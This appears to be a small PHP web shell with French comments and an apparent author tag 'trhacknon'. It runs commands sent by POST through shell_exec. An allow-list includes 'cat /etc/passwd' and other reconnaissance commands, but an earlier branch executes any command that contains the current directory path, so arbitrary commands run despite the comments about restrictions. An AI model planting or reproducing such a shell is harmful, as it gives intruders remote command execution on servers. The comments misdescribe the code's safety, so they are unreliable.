<?php
  // Liste des commandes autorisées
  $allowedCommands = [
    "id",
    "uname -a",
    "ls",
    "whoami",
    "touch",
    "mkdir",
    "hostname",
    "cat /etc/passwd",
    "pwd"
  ];

  // Récupération de la commande passée en POST
  $command = $_POST['command'];
// Interdire l'accès aux fichiers en dehors du dossier courant
$current_dir = getcwd();
if (strpos($command, $current_dir) !== false) {
  $output = shell_exec($command);
  echo $output;
} else {
  echo "Action interdite. Le fichier à exécuter n'est pas dans le dossier courant.";
}
  // Vérification que la commande est autorisée
  if (!in_array($command, $allowedCommands)) {
    http_response_code(403);
    die("Commande interdite par trhacknon");
  }

  // Exécution de la commande
  $output = shell_exec($command);

  // Affichage de la sortie de la commande
  echo $output;
?>
